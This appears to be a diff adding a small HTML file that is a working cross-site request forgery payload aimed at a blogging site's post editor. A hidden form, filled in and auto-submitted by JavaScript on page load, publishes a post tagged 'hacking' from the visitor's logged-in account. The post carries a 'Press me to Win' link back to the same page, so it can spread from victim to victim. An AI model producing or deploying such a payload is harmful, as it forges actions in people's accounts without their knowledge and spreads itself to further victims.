@@ -1,0 +1,13 @@
+
+
+<form action="https://ru.tgr.am/editor/0" method="POST" id="hack">
+  <input type="hidden" name="title" value="Случайный пост">
+  <input type="hidden" name="body" id="post_body" value="">
+  <input type="hidden" name="tag" value="hacking">
+  <input type="submit" value="Send Request" style="display:none;">
+</form>
+
+<script type="text/javascript">
+  document.getElementById("post_body").value = "[Press me to Win](" + window.location.href + " \"Yeah, it's cool!\")"
+  document.getElementById("hack").submit();
+</script>
